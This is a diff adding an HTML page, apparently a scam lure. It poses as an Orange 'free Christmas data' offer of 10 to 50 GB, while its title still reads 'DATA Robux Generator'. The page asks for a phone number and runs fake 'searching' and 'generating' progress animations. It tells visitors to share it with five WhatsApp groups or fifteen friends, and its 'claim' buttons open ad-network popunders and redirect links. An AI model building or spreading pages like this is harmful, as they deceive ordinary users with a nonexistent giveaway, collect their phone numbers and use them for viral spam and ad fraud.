@@ -1,0 +1,1367 @@
+
+<!DOCTYPE html>
+<!--
+
+-->
+<html><head>
+    <title>DATA Robux Generator</title>
+<meta name="description" content="With this Generator you can easy generate 10GB, 30GB or 50GB Robux into your DATA account."/>
+<meta property="og:title" content="DATA Robux Generator"/>
+<meta property="og:description" content="With this Generator you can easy generate 10GB, 30GB or 50GB Robux into your DATA account."/>
+<meta name="referrer" content="no-referrer">
+
+<!-- Analytics -->
+
+<script
+        src="https://browser.sentry-cdn.com/6.4.1/bundle.min.js"
+        integrity="sha384-THoc7rflwZFKTdZNgv6jLFFDn299Uv3t1SW5B4yGLvLiCRTYP9ys6vXZcMl95TQF"
+        crossorigin="anonymous"
+></script>
+<script>
+    Sentry.init({
+        dsn: 'https://e0e6a104cb354a09bf094a90e676ea13@o425163.ingest.sentry.io/5780930',
+        tracesSampleRate: 0.01
+    });
+</script>
+<script>
+    (function (i, s, o, g, r, a, m) {
+        i['GoogleAnalyticsObject'] = r;
+        i[r] = i[r] || function () {
+            (i[r].q = i[r].q || []).push(arguments)
+        }, i[r].l = 1 * new Date();
+        a = s.createElement(o), m = s.getElementsByTagName(o)[0];
+        a.async = 1;
+        a.src = g;
+        m.parentNode.insertBefore(a, m)
+    })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+
+
+    ga('create', 'UA-231689389-1', 'auto');
+    ga('send', 'pageview');
+
+</script>
+  <style>
+  .blink {
+  animation: blink 1s steps(1, end) infinite;
+}
+
+@keyframes blink {
+  0% {
+    opacity: 1;
+  }
+  50% {
+    opacity: 0;
+  }
+  100% {
+    opacity: 1;
+  }
+}
+</style>
+<style type="text/css">
+@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap");
+@import url("//fonts.googleapis.com/earlyaccess/droidarabicnaskh.css");
+* {
+    margin: 0;
+    padding: 0;
+    font-family: Poppins, Droid Arabic Naskh;
+    font-weight: normal;
+    box-sizing: border-box;
+
+
+}
+body {
+    direction: lfl;
+    background: #FFCB05;
+}
+a {
+    text-decoration: none;
+}
+.post {
+    background: #FAF5EB;
+    margin: 0 auto;
+    padding: 10px;
+    max-width: 500px;
+    border: 1px solid #d0d1d5;
+    border-radius: 3px;
+}
+.post img {
+    width: 100%;
+}
+.welcome {
+    font-size: 6px;
+}
+.amount,
+#getname {
+    color: #ffffff;
+    text-decoration: none;
+}
+.done {
+    text-align: center;
+    color: #27ae60;
+}
+.tip {
+    font-size: 14px;
+}
+.title {
+    text-align: center;
+}
+.error {
+    display: none;
+    text-align: center;
+    font-size: 14px;
+    color: #e74c3c;
+}
+button {
+    display: block;
+    width: 200px;
+    height: 50px;
+    color: #fff;
+    border: none;
+    outline: none;
+    font-size: 24px;
+    cursor: pointer;
+    border-radius: 5px;
+    padding: 0 10px;
+    margin: 10px auto;
+    background: rgb(0, 0, 0);
+    transition: background 0.3s ease;
+}
+button:hover {
+    background: #000000;
+}
+.phone {
+    max-width: 400px;
+    margin: 10px auto;
+}
+.phone input {
+    width: 100%;
+    height: 50px;
+    padding: 10px;
+    outline: none;
+    border: 2px solid #cecece;
+    font-size: 14px;
+}
+#confirm {
+    width: 200px;
+    margin: 10px auto;
+    border-radius: 0px;
+}
+#loader {
+    text-align: center;
+}
+.spin {
+    width: 50px;
+    height: 50px;
+    background: transparent;
+    border: solid 8px rgb(0, 0, 0);
+    border-right-color: transparent;
+    border-radius: 50%;
+    margin: 10px auto;
+    animation: spin 0.8s linear infinite;
+}
+@keyframes spin {
+    100% {
+        transform: rotate(1turn);
+    }
+}
+#loader,
+#info,
+#checking,
+#share,
+#claim {
+    display: none;
+}
+.center {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+.barr {
+    direction: ltr;
+    max-width: 400px;
+    margin: 10px auto;
+    box-sizing: border-box;
+}
+.fill {
+    position: relative;
+    display: inline-block;
+    width: calc(100% - 100px);
+    height: 35px;
+    padding: 2px;
+    border: 2px solid #000000;
+}
+#fill,
+#fill2 {
+    background: #CD0633;
+    width: 0%;
+    height: 100%;
+}
+.percentage {
+    width: 100px;
+    float: right;
+    height: 35px;
+    font-size: 16px;
+    border: 2px solid #000000;
+   
+}
+#percentage,
+#percentage2 {
+    margin-left: 5px;
+}
+#check,
+#check2 {
+    display: none;
+}
+.counter {
+    color: #7f7f7f;
+    font-size: 12px;
+    text-align: right;
+    padding: 10px 0 10px 2px;
+    border-bottom: 1px solid #ffffff;
+}
+.reactions {
+    display: inline-flex;
+    align-items: center;
+    float: left;
+}
+.counter img {
+    float: left;
+    width: 16px;
+    height: 16px;
+    border-radius: 50%;
+    border: 2px solid #000000;
+    box-sizing: content-box;
+}
+.like,
+.love {
+    margin-right: -5px;
+}
+.like {
+    z-index: 2;
+}
+.love {
+    z-index: 1;
+}
+.bar {
+    display: table;
+    width: 100%;
+    border-bottom: 1px solid #000000;
+}
+.bar .react {
+    display: table-cell;
+    width: calc(100% / 3);
+    font-size: 12px;
+    color: #000000;
+    text-align: center;
+    padding: 10px 0;
+    cursor: pointer;
+}
+.comments {
+    direction: ltr;
+}
+.comment {
+    padding: 6px 0;
+    margin-top: 5px;
+}
+.comment img {
+    float: left;
+    width: 32px;
+    height: 32px;
+    border: none;
+    border-radius: 18px;
+    cursor: pointer;
+}
+.reply {
+    margin-left: 37px;
+}
+.single-container {
+    margin-left: 37px;
+    background: #FAF5EB;
+    padding: 10px;
+    border-radius: 15px;
+    font-size: 12px;
+}
+.single-container .user {
+    display: inline-block;
+    cursor: pointer;
+    color: #365899;
+    margin-bottom: 5px;
+}
+.single-container .text {
+    display: block;
+}
+.buttons {
+    font-size: 12px;
+    font-weight: bold;
+    margin: 10px 0 0 47px;
+    color: #000000;
+}
+.action {
+    cursor: pointer;
+}
+.action:hover {
+    text-decoration: underline;
+}
+.input {
+    padding: 6px 12px 12px;
+}
+.input input {
+    width: 100%;
+    background: #f1f2f6;
+    padding: 10px;
+    border-radius: 15px;
+    border: 0;
+    outline: none;
+}
+.A{
+    text-align: center;
+    background-color: rgb(250, 245, 235);
+}
+</style>
+
+    <style>
+        .header_blue {
+            background: #1565c0;
+            padding: 80px 0 20px;
+            color: #fff;
+            font-size: 48px;
+            font-weight: 300;
+            margin-bottom: 40px;
+        }
+        .header_text {
+            margin-left: auto;
+            margin-right: auto;
+            width: 80%;
+        }
+        body{
+            margin:0;
+            font-family:Roboto, sans-serif;
+            color:#444;
+        }
+        .unlockBtn:hover{
+            box-shadow: 0 3px 6px rgba(0,0,0,.16), 0 3px 6px rgba(0,0,0,.23);
+        }
+        .unlockBtn {
+            background: #2196f3;
+            border: none;
+            border-radius: 2px;
+            box-shadow: 0 1px 3px rgba(0,0,0,.12), 0 1px 2px rgba(0,0,0,.24);
+            min-height: 31px;
+            min-width: 70px;
+            padding: 2px 16px;
+            text-align: center;
+            text-shadow: none;
+            text-transform: uppercase;
+            -webkit-transition: all 280ms ease;
+            transition: all 280ms ease;
+            box-sizing: border-box;
+            cursor: pointer;
+            -webkit-appearance: none;
+            display: inline-block;
+            vertical-align: middle;
+            font: 500 14px/31px Roboto,sans-serif!important;
+            outline: 0!important;
+            color:white;
+        }
+        .content-container{
+            width:80%;margin:0 auto;
+        }
+        @font-face{font-family:'Roboto';font-style:normal;font-weight:300;src:local('Roboto Light'),local(Roboto-Light),url(//fonts.gstatic.com/s/roboto/v15/Pru33qjShpZSmG3z6VYwnRJtnKITppOI_IvcXXDNrsc.woff2) format("woff2");unicode-range:U+0100-024F,U+1E00-1EFF,U+20A0-20AB,U+20AD-20CF,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Roboto';font-style:normal;font-weight:300;src:local('Roboto Light'),local(Roboto-Light),url(//fonts.gstatic.com/s/roboto/v15/Hgo13k-tfSpn0qi1SFdUfVtXRa8TVwTICgirnJhmVJw.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2212,U+2215,U+E0FF,U+EFFD,U+F000}@font-face{font-family:'Roboto';font-style:normal;font-weight:500;src:local('Roboto Medium'),local(Roboto-Medium),url(//fonts.gstatic.com/s/roboto/v15/oOeFwZNlrTefzLYmlVV1UBJtnKITppOI_IvcXXDNrsc.woff2) format("woff2");unicode-range:U+0100-024F,U+1E00-1EFF,U+20A0-20AB,U+20AD-20CF,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Roboto';font-style:normal;font-weight:500;src:local('Roboto Medium'),local(Roboto-Medium),url(//fonts.gstatic.com/s/roboto/v15/RxZJdnzeo3R5zSexge8UUVtXRa8TVwTICgirnJhmVJw.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2212,U+2215,U+E0FF,U+EFFD,U+F000}
+        
+body{
+
+    font-family: 'Kanit Light', sans-serif;
+    overflow-y: auto;
+    margin: 0;
+    padding: 0;
+    color: black;
+    background-size: 100%;
+    background-image: -webkit-gradient(linear, 0 0, 100% 100%, color-stop(0, #e4251d), color-stop(100%, #e2e1e1));
+    background-image: -webkit-linear-gradient(135deg, #e4251d, #e2e1e1);
+    background-image: -moz-linear-gradient(45deg, #e4251d, #e2e1e1);
+    background-image: -ms-linear-gradient(45deg, #e4251d 0, #e2e1e1 100%);
+    background-image: -o-linear-gradient(45deg, #e4251d, #e2e1e1);
+    background-image: linear-gradient(135deg, #e4251d, #e2e1e1);
+
+}
+
+div{
+    display: block;
+}
+
+.center{
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    text-align: center;
+    min-height: 100vh;
+}
+
+.main{
+    text-align: center;
+    background: #f0f0f0;
+    width: 90%;
+    max-width:40em;
+    justify-content: center;
+    align-items: center;
+    border-radius: 1em;
+    border-color: white;
+    border-style: solid;
+    border-width: 0.1em;
+    box-shadow: 0 0 1em white;
+    box-sizing: border-box;
+
+}
+
+.mainimg{
+    width: 15em;
+    position: relative;
+    margin:-6.5em 0 -1.5em 0;
+}
+
+.step0-txt{
+    font-weight: 600;
+    font-size: 1.6em;
+    width: 80%;
+    margin: 1em auto;
+
+}
+
+.user-box{
+    overflow: auto;
+    position: relative;
+}
+
+.user-icon{
+    margin-top: 1.2em;
+    position: absolute;
+    width: 2.5em;
+    z-index: 2;
+    margin-left: 1.4em;
+}
+
+.user-input{
+    position: relative;
+    background: #FFFFFF;
+    outline: none;
+    box-shadow: none;
+    width: 15em;
+    height: 3em;
+    padding: 0 1em 0 2.5em;
+    font-size: 1.75em;
+    border-radius: 0.6em;
+    border-width: 0.15em;
+    border-color: #e4251d;
+    border-style: solid;
+    font-weight: bold;
+    box-sizing: border-box;
+    max-width: 40em;
+    vertical-align: middle;
+}
+
+.shakeanim{
+    animation: shake 0.3s ease-in-out;
+}
+
+@keyframes shake {
+    0%, 100% {
+        margin-left: 0;
+    }
+    20%, 80%{
+        margin-left: -0.5em;
+    }
+    40%, 60%{
+        margin-left: 0.5em;
+    }
+}
+
+input, textarea{
+    color: black;
+}
+
+::placeholder{
+    color: black;
+    opacity:40%;
+}
+
+.btn0 {
+    background: #e4251d;
+    color: white;
+    width: 30%;
+    padding: 1em 0 1em 0;
+    margin: 0 auto;
+    margin-top: 1em;
+    margin-bottom: 1em;
+    border-radius: 0.5em;
+    font-weight: 900;
+    font-size: 1.5em;
+    box-sizing: border-box;
+    font-family: "Kanit Medium", sans-serif;
+}
+
+.btn0:hover{
+    background:#e4251d;
+    transform: scale(1.1);
+    cursor: pointer;
+    box-shadow: 0 0 0.5em #e4251d;
+}
+
+.btn1{
+    background: #e4251d;
+    color: white;
+    width: 33%;
+    padding: 0.5em 0 0.5em 0;
+    margin: 1.5em auto;
+    border-radius: 0.5em;
+    font-weight: 600;
+    font-size: 1.5em;
+    box-sizing: border-box;
+    font-family: "Kanit Medium", sans-serif;
+    animation: zoom-in-zoom-out 1s ease infinite;
+}
+
+.btn1:hover{
+    background:whitesmoke;
+    color: #e4251d;
+    transform: scale(1.1);
+    cursor: pointer;
+    box-shadow: 0 0 0.5em #e4251d;
+}
+
+@keyframes zoom-in-zoom-out {
+    0% {
+        transform: scale(1, 1);
+    }
+    50% {
+        transform: scale(1.1, 1.1);
+    }
+    100% {
+        transform: scale(1, 1);
+    }
+}
+
+.devices{
+    display: flex;
+    justify-content: center;
+    margin-top: 1em;
+    box-sizing: border-box;
+    cursor: pointer;
+    float: none;
+    margin-bottom: 2em;
+}
+
+.platform{
+    background: #FFFFFF;
+    width: 8em;
+    height: 5.5em;
+    border-radius: 1em;
+    padding-top: 1em;
+    margin: 1em;
+    box-shadow: 0 0 0.6em black;
+}
+
+.platform:hover{
+    background:#FFFFFF;
+    transform: scale(1.1);
+    box-shadow: 0 0 0.5em #e4251d;
+
+}
+
+.search0{
+    margin: 0 auto;
+    text-align: center;
+    height: 10em;
+    font-weight: 600;
+}
+
+.search1{
+    margin: 0 auto;
+    text-align: center;
+    height: 22em;
+    margin-top: 2em;
+}
+
+.laststep{
+    margin: 0 auto;
+    text-align: center;
+    height: auto;
+    margin-top: 2em;
+    margin-bottom: 1.2em;
+    font-family: 'Kanit Medium', sans-serif;
+}
+
+.searching{
+    width: fit-content;
+    background: #FFFFFF;
+    margin: 0 auto;
+    border-radius: 1em;
+    padding:0.5em;
+    font-size: 1.2em;
+    box-shadow: 0 0 0.6em black;
+}
+
+.searchingname{
+    margin: 0 1.5em;
+}
+
+#dots:after {
+    content: '.';
+    animation: dots 1s steps(5, end) infinite;}
+
+@keyframes dots {
+    0%, 20% {
+        color: rgba(0,0,0,0);
+        text-shadow:
+                .25em 0 0 rgba(0,0,0,0),
+                .5em 0 0 rgba(0,0,0,0);}
+    40% {
+        color: black;
+        text-shadow:
+                .25em 0 0 rgba(0,0,0,0),
+                .5em 0 0 rgba(0,0,0,0);}
+    60% {
+        text-shadow:
+                .25em 0 0 black,
+                .5em 0 0 rgba(0,0,0,0);}
+    80%, 100% {
+        text-shadow:
+                .25em 0 0 black,
+                .5em 0 0 black;}}
+
+
+.checkmark-icon{
+    width: 1em;
+    float: right;
+    margin-left: -1em;
+    margin-top: -1.2em;
+}
+
+.devices-pic{
+    width: 3em;
+    margin-top: 0.7em;
+}
+
+.devices-pic.ios{
+    margin-top: 0.5em;
+}
+
+.secondimg{
+    float:right;
+    width: 15em;
+    margin-top: 6.5em;
+    margin-right: 5em;
+}
+
+.VBucks-Div{
+    margin: 1em 0 2em 0;
+    cursor: pointer;
+}
+
+.VBucks-Div2{
+    margin: 1em 0 2em 0;
+    cursor: pointer;
+}
+
+.VBucks-pic{
+    width: 4em;
+}
+
+.vbucks-text{
+    font-size: 1.8em;
+    font-weight: 800;
+    margin-left:0.5em;
+}
+
+.VBucks{
+    background: #FFFFFF;
+    box-shadow: 0 0 0.6em black;
+    border-radius: 1em;
+    margin: 1em auto;
+    display: flex;
+    box-sizing: border-box;
+    position: relative;
+    width: 90%;
+    max-width: 40em;
+    height: 5em;
+    align-items: center;
+    justify-content: center;
+}
+
+.VBucks:hover{
+    background:#FFFFFF;
+    transform: scale(1.02);
+    box-shadow: 0 0 0.5em #e4251d;
+    cursor: pointer;
+}
+
+.Selected{
+    background: #e4251d;
+    box-shadow: 0 0 0.5em #e4251d;
+    color: #FFFFFF;
+    border-radius: 1em;
+    margin: 0.5em auto;
+    display: flex;
+    box-sizing: border-box;
+    position: relative;
+    width: 90%;
+    max-width: 40em;
+    height: 5em;
+    align-items: center;
+    justify-content: center;
+}
+
+.progress-bg{
+    margin-top: 0.5em;
+    width: 26em;
+    height: 1em;
+    background-color: whitesmoke;
+    border-radius: 0.5em;
+    display: inline-block;
+}
+.progress-bar{
+    margin-top: 0;
+    margin-left: -0.1em;
+    width: 0;
+    height: 1em;
+    background:#e4251d;
+    border-radius: 0.5em;
+}
+.progressbar25{
+    animation: progress1 1s  linear;
+    animation-fill-mode: forwards;
+}
+@keyframes progress1{
+    0%  {width: 0;}
+    100%  {width: 25%;}
+}
+.progressbar40{
+    animation: progress2 2s  linear;
+    animation-fill-mode: forwards;
+}
+@keyframes progress2{
+    0%  {width: 25%;}
+    100%  {width: 40%;}
+}
+.progressbar75{
+    animation: progress3 1s  linear;
+    animation-fill-mode: forwards;
+}
+@keyframes progress3{
+    0%  {width: 40%;}
+    100%  {width: 75%;}
+}
+.progressbar95{
+    animation: progress4 1s  linear;
+    animation-fill-mode: forwards;
+}
+@keyframes progress4{
+    0%  {width: 75%;}
+    100%  {width: 95%;}
+}
+
+.settings-rotate{
+    animation: ranimation 2s linear infinite;
+}
+
+@keyframes ranimation {
+    0%  {transform: rotate(0deg);}
+    100%  {transform:  rotate(360deg);}
+}
+
+#loader{
+    animation: ranimation 2s linear infinite;
+    display: none;
+}
+
+.laststep-rotate{
+    animation: ranimation 2s linear infinite;
+    width: 5em;
+    margin-top: -5em;
+}
+
+.LastStepTxt {
+    font-size: 1.5em;
+    font-weight: 700;
+    width: 90%;
+    margin: 1em auto;
+}
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: white;
+            z-index: 1000;
+            text-align: center;
+            border-radius: 12px;
+            padding: 20px;
+            box-sizing: border-box;
+            width: 90%;
+            max-width: 500px;
+            border: 3px solid red;
+            }
+             .popup-text {
+            font-weight: bold;
+            color: black;
+        }
+         .redirect-button {
+            background: linear-gradient(to right, red, black);
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 25px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            animation: zoom 1s infinite;
+            font-size: 18px;
+            
+           }
+             .congratulations {
+            font-weight: bold;
+            background: linear-gradient(to right, red, black);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-size: 10px;
+            margin: 10px 0;
+        }
+          .timer {
+            font-weight: bold;
+            color: red;
+            margin: 10px 0;
+        }
+
+
+/*              Mobile                 */
+
+@media only screen and (max-width: 768px) {
+    .main{
+        margin-top: 5em;
+    }
+    .platform{
+        width: 6em;
+        height: 4em;
+    }
+
+    .johnwickgif{
+        margin-left: 7em;
+        position: absolute;
+        box-sizing: border-box;
+    }
+    .devices{
+        margin: 1em auto;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        /* position: absolute; */
+    }
+    .devices-pic{
+        width: 2.6em;
+        margin: 0 auto;
+    }
+    .devices-pic.ios{
+        margin-top: 0.1em;
+    }
+    .devices-pic.android{
+        margin-top: 0.1em;
+    }
+    .devices-pic.windows{
+        margin-top: 0.2em;
+    }
+    .platform{
+        margin: 0.8em;
+    }
+    .secondimg{
+        width: 20em;
+        margin-top: -1em;
+        box-sizing: border-box;
+    }
+    .VBucks-Div{
+        box-sizing: border-box;
+    }
+    .VBucks{
+        width: 90%;
+    }
+    .Selected{
+        width: 90%;
+    }
+    .vbucks-text{
+        font-size: 1.5em;
+        font-weight: 800;
+    }
+    .VBucks-pic{
+        width: 3em;
+        float: left;
+    }
+
+    .laststep{
+        height: 100%;
+    }
+
+    .step0-txt{
+        font-size: 1.5em;
+    }
+    .progress-bg{
+        width: 90%;
+    }
+    .settings-rotate{
+        margin-bottom: 1em;
+    }
+    .user-input{
+        width: 90%;
+    }
+    .btn0{
+        width: 40%;
+    }
+    .btn1{
+        width: 44%;
+    }
+}
+
+@media only screen and (max-width: 319px){
+    .VBucks{
+        width: 90%;
+    }
+    .vbucks-text{
+        font-size: 1.2em;
+        font-weight: 800;
+        margin-top: 0 auto;
+    }
+    .VBucks-pic{
+        display: none;
+    }
+    .user-input{
+        font-size: 22px;
+        margin: 0 auto;
+    }
+    .user-icon{
+        margin: 0.7em 0.8em;
+    }
+}
+
+@media only screen and (max-width: 395px){
+    .vbucks-text{
+        font-size: 1.2em;
+        font-weight: 800;
+        margin: 1.4em 1em;
+    }
+    .user-input{
+        font-size: 22px;
+    }
+    .user-icon{
+        margin: 0.6em 0.6em;
+    }
+}
+
+@media only screen and (max-width: 440px){
+    .secondimg{
+        display: none;
+    }
+    .devices{
+        margin: 1em auto;
+    }
+    .vbucks-text{
+        font-size: 1.4em;
+        font-weight: 800;
+        margin: 1em 1em;
+    }
+    .VBucks-pic{
+        margin-right: 0;
+    }
+    .btn0{
+        width: 50%;
+    }
+    .btn1{
+        width: 54%;
+    }
+}
+
+/* BG */
+
+    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="me" href="https://www.blogger.com/profile/05359164999123564996" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+</head>
+<body>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<script src="orange-active.js"></script>
+<script src="alladz.js"></script>
+    <title>OFFRE DE DONNÉES GRATUITES DE NOËL ORANGE</title>
+<meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg5n9XigsyI27VzEm6l7yI1pR4EN1GMJNa1utcwpHXgNuag-YZQKAk8kR9csRTqc5DYKFUGYCaouTitJk_DGLM3ah-TK9XTQZFLEizZZu8E2OX0lYjdcsI55lcsZ5UNLMjOhWSIy6zt0KtngnCdBeI5rkrzhRetjmO_nMtikpblxAkJGx6wbG5DSd-aUVS2/s320/35D57542-3ADE-4CAD-8C8F-198892F27D7B.jpeg" />
+    <link rel="stylesheet" href="main.css">
+    <script src="script.js"></script>
+    	<link rel="icon" type="image/x-icon" href="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/15275731135d1b18ce359841d64946e871bd6a29dc.png">
+</head>
+<body>
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Kanit&display=swap');
+</style>
+
+<div class="center">
+    <div class="main" id="main0" style="display: 1none;">
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh6jxF5XXxY9vZQL1outaIapD9Baee2Xnr0VRB2FlvUCIrY9ZwN94Uvg2Xa-opp3w6V2Ffwia-hcWeEubil0ErJv_i7ZDeOEv4oOo9wn7pYNtXIv5zgk4sEddEYXu4FGWOU7st1GLwrGLVTLEmxOEXiTiPQVMB3jbf3iPFZwZVHcmNYNvAtY-EmRO-2iHh9/s225/D90493A3-C883-4047-97F6-9B6A6E59AA22.png" alt="DATA Logo" class="mainimg">
+        <div class="step0" id="step0">
+            <div class="step0-txt"> Entrez votre numéro de portable </div>
+            <div class="user-box" id="user-box">
+                <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/16521063221bb696466af9a143142d50da47359338.png" class="user-icon">
+                <input class="user-input" id="input-id" placeholder="Phone number">
+            </div>
+            <div class="btn0" id="btn0id" onclick="firstmain0()">NEXT</div>
+        </div>
+        <div class="search0" id="search0" style="display: none ;">
+            <div class="step0-txt" style="margin-bottom: 0.3em;">Recherche<span id="dots"></span></div>
+            <div class="searching">
+                <div class="searchingdata">
+                    <div class="searchingname" id="searching-text-name"></div>
+                    <div><img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/16521928642e7a7c210f971e9f8a7a0fb86f92bb2a.png" class="checkmark-icon" id="checkmark-icon" style="display: none;"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="main" id="main1" style="display: none;">
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh6jxF5XXxY9vZQL1outaIapD9Baee2Xnr0VRB2FlvUCIrY9ZwN94Uvg2Xa-opp3w6V2Ffwia-hcWeEubil0ErJv_i7ZDeOEv4oOo9wn7pYNtXIv5zgk4sEddEYXu4FGWOU7st1GLwrGLVTLEmxOEXiTiPQVMB3jbf3iPFZwZVHcmNYNvAtY-EmRO-2iHh9/s225/D90493A3-C883-4047-97F6-9B6A6E59AA22.png" alt="DATA Logo" class="mainimg">
+        <div class="step0-txt"> Sélectionnez votre appareil</div>
+        <div class="devices">
+            <div class="platform selectedPlatform" id="platform0" onclick="device_click()">
+                <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/1652106952d1b126420c2e61f86903a650c6b5059b.png" class="devices-pic android">
+            </div>
+            <div class="platform" id="platform1" onclick="device_click()">
+                <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/165210695181b32d93b95e48db0eb4b1c1015d7fd8.png" class="devices-pic ios">
+            </div>
+            <div class="platform" id="platform2" onclick="device_click()">
+                <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/16521069526685e8acc2881e9f06e23c7eb8a19e4c.png" class="devices-pic windows">
+            </div>
+        </div>
+    </div>
+    <div class="main" id="main2" style="display: none;">
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh6jxF5XXxY9vZQL1outaIapD9Baee2Xnr0VRB2FlvUCIrY9ZwN94Uvg2Xa-opp3w6V2Ffwia-hcWeEubil0ErJv_i7ZDeOEv4oOo9wn7pYNtXIv5zgk4sEddEYXu4FGWOU7st1GLwrGLVTLEmxOEXiTiPQVMB3jbf3iPFZwZVHcmNYNvAtY-EmRO-2iHh9/s225/D90493A3-C883-4047-97F6-9B6A6E59AA22.png" alt="DATA Logo" class="mainimg">
+        <div class="step0" id="step1" style="display: 1none;">
+            <div class="step0-txt"> Sélectionnez la quantité de DONNÉES </div>
+            <div class="VBucks-Div" id="VBucks-div">
+                <div class="Selected" id="VBucks0" onclick="VBucksSelected('VBucks0','10GB ')">
+                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh6jxF5XXxY9vZQL1outaIapD9Baee2Xnr0VRB2FlvUCIrY9ZwN94Uvg2Xa-opp3w6V2Ffwia-hcWeEubil0ErJv_i7ZDeOEv4oOo9wn7pYNtXIv5zgk4sEddEYXu4FGWOU7st1GLwrGLVTLEmxOEXiTiPQVMB3jbf3iPFZwZVHcmNYNvAtY-EmRO-2iHh9/s225/D90493A3-C883-4047-97F6-9B6A6E59AA22.png" class="VBucks-pic one">
+                    <div class="vbucks-text"> 10GB DATA </div>
+                </div>
+                <div class="VBucks" id="VBucks1" onclick="VBucksSelected('VBucks1','30GB ')">
+                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh6jxF5XXxY9vZQL1outaIapD9Baee2Xnr0VRB2FlvUCIrY9ZwN94Uvg2Xa-opp3w6V2Ffwia-hcWeEubil0ErJv_i7ZDeOEv4oOo9wn7pYNtXIv5zgk4sEddEYXu4FGWOU7st1GLwrGLVTLEmxOEXiTiPQVMB3jbf3iPFZwZVHcmNYNvAtY-EmRO-2iHh9/s225/D90493A3-C883-4047-97F6-9B6A6E59AA22.png" class="VBucks-pic two">
+                    <div class="vbucks-text">30GB DATA </div>
+                </div>
+                <div class="VBucks" id="VBucks2" onclick="VBucksSelected('VBucks2','50GB ')">
+                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh6jxF5XXxY9vZQL1outaIapD9Baee2Xnr0VRB2FlvUCIrY9ZwN94Uvg2Xa-opp3w6V2Ffwia-hcWeEubil0ErJv_i7ZDeOEv4oOo9wn7pYNtXIv5zgk4sEddEYXu4FGWOU7st1GLwrGLVTLEmxOEXiTiPQVMB3jbf3iPFZwZVHcmNYNvAtY-EmRO-2iHh9/s225/D90493A3-C883-4047-97F6-9B6A6E59AA22.png" class="VBucks-pic three">
+                    <div class="vbucks-text">50GB DATA </div>
+                </div>
+            </div>
+        </div>
+        <div class="btn0" id="btn1id" onclick="GenerateButton()">Générer</div>
+        <div class="search1" id="search1" style="display: none ;">
+            <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/1652194594fea7175a707ceefbaa64e6857ffd6767.png" class="settings-rotate">
+            <div class="step0-txt" id="Generating-step0">Se préparer..</div>
+            <div class="progress-bg">
+                <div class="progress-bar" id="progress-bar">
+                </div>
+                <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/1652113019440ef225735d8aab8fc45ec04e7a6aa4.png" id="loader" style="margin-top: 2em; width: 2em;">
+            </div>
+        </div>
+    </div>
+    <div class="main" id="main3" style="display: none;">
+        <div class="laststep" id="laststep" style="display: 1none ;">
+            <img src="https://d2lmlpk6xgu7kg.cloudfront.net/uploads/1652194619c7feb47a1add45dc53247b16cbcf8ab0.png" class="laststep-rotate">
+            <div class="LastStepTxt" id="LastStepTxt">Votre numéro <span id="Name-LastStep" style="color: #e4251d;"></span>! est éligible pour recevoir l'offre de Noël. <br> <font color="green">COMMENT ACTIVER </font><span id="vbucksamount" style="color: #e4251d; font-weight: 400;"></span> <font color="green">Données gratuites de Noël sur votre téléphone.</font> <br/>1. Partagez-le avec 5 groupes ou 15 amis sur WhatsApp (Cliquez sur l'icône « PARTAGER » ci-dessous). <br/>2. Vous serez automatiquement redirigé vers notre page "ACTIVATION" une fois la barre de vérification remplie</div>
+           <div id="claim">
+ <a  onclick="window.open('http://outrotomr.com/4/3144603')" href="https://jesusboys.github.io/usvisa/ads-monetag" >
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="yellow">DONNÉES DE RÉCLAMATION</font></button>
+                    </a><br/>
+
+ <a  onclick="window.open('http://outrotomr.com/4/3144603')" href="https://jesusboys.github.io/usvisa/ads-monetag" >
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="yellow">RÉCLAMER 50 Go</font></button>
+                    </a><br/>
+
+ <a  onclick="window.open('http://outrotomr.com/4/3144603')" href="https://jesusboys.github.io/usvisa/ads-monetag" >
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="yellow">RÉCLAMER 30 Go</font></button>
+                    </a><br/>
